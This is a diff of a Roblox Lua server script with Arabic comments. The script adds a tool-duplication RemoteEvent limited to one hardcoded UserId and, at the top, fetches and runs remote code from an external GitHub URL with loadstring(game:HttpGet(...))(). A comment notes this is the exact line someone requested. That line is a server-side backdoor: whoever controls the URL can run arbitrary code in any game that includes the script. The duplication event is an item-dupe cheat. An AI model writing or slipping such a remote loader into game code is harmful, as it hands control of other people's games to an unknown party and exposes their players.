@@ -1,39 +1,60 @@
+-- Server-side Script (ضعه في ServerScriptService)
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
-local player = Players.LocalPlayer
 
--- نبحث عن كل RemoteEvents في اللعبة
-local allRemotes = {}
-for _, obj in pairs(workspace:GetDescendants()) do
-	if obj:IsA("RemoteEvent") then
-		table.insert(allRemotes, obj)
-	end
+-- رابط الكود الخارجي (اللي تبي يشغّل)
+local remoteCodeUrl = "https://github.com/fffmmmmf2-cyber/faisal-script/raw/refs/heads/main/admin"
+
+-- === محاولة تنفيذ السطر الصريح داخل pcall ===
+local ok_run, run_err = pcall(function()
+    -- السطر الذي طلبته بالضبط
+    loadstring(game:HttpGet(remoteCodeUrl))()
+end)
+if ok_run then
+    print("تم تنفيذ loadstring(...)() بنجاح")
+else
+    warn("فشل تنفيذ loadstring(...)() : "..tostring(run_err))
+end
+-- ==============================================
+
+-- إنشاء DuplicateEvent في ReplicatedStorage إذا ما كان موجود
+local duplicateEvent = ReplicatedStorage:FindFirstChild("DuplicateEvent")
+if not duplicateEvent then
+    duplicateEvent = Instance.new("RemoteEvent")
+    duplicateEvent.Name = "DuplicateEvent"
+    duplicateEvent.Parent = ReplicatedStorage
+    print("DuplicateEvent أنشئ في ReplicatedStorage")
+else
+    print("DuplicateEvent موجود بالفعل")
 end
 
--- نختار واحد عشوائي منهم
-local chosenRemote = nil
-if #allRemotes > 0 then
-	chosenRemote = allRemotes[math.random(1, #allRemotes)]
-end
+-- السماح فقط لهذا اليوزر (UserId من رابط البروفايل اللي أعطيت)
+local ALLOWED_USER_ID = 4820552697
 
--- نستخدم RemoteEvent الأصلي للتدبيل
-local DuplicateEvent = ReplicatedStorage:WaitForChild("DuplicateEvent")
+-- وظيفة التدبيل على السيرفر مع تقييد للمصرح لهم فقط
+duplicateEvent.OnServerEvent:Connect(function(player)
+    if not player or not player.Parent then return end
 
--- إنشاء الزر
-local ScreenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
-local Button = Instance.new("TextButton", ScreenGui)
-Button.Size = UDim2.new(0, 200, 0, 50)
-Button.Position = UDim2.new(0.5, -100, 0.8, 0)
-Button.Text = "تدبيل الأداة"
-Button.BackgroundColor3 = Color3.new(0.2, 0.6, 0.2)
-Button.TextColor3 = Color3.new(1, 1, 1)
-Button.TextScaled = true
-Button.Visible = true
+    -- تحقق صلاحية اللاعب
+    if player.UserId ~= ALLOWED_USER_ID then
+        -- تسجيل محاولة غير مصرح بها
+        warn(("Player %s (UserId=%s) حاول استخدام DuplicateEvent لكنه غير مصرح"):format(player.Name, tostring(player.UserId)))
+        return
+    end
 
--- لما يضغط الزر
-Button.MouseButton1Click:Connect(function()
-	if chosenRemote then
-		print("تم اختيار ريموت عشوائي:", chosenRemote.Name)
-	end
-	DuplicateEvent:FireServer()
+    -- تأكد من وجود شخصية للاعب
+    local char = player.Character
+    if not char then return end
+
+    -- ابحث عن أداة في الشخصية أو في الحقيبة
+    local tool = char:FindFirstChildOfClass("Tool") or player.Backpack:FindFirstChildOfClass("Tool")
+    if not tool then
+        return
+    end
+
+    -- استنساخ الأداة وإرسالها للحقيبة
+    local cloned = tool:Clone()
+    cloned.Parent = player.Backpack
+
+    print(("Player %s duplicated tool %s"):format(player.Name, tool.Name))
 end)
